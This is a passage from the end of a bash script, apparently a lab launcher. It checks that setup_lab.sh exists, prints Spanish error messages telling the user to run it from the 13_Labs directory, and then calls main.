if [[ ! -f "setup_lab.sh" ]]; then
    echo -e "${RED}❌ Error: No se encuentra setup_lab.sh${NC}"
    echo -e "${YELLOW}Ejecuta este script desde el directorio 13_Labs${NC}"
    exit 1
fi

# Iniciar
main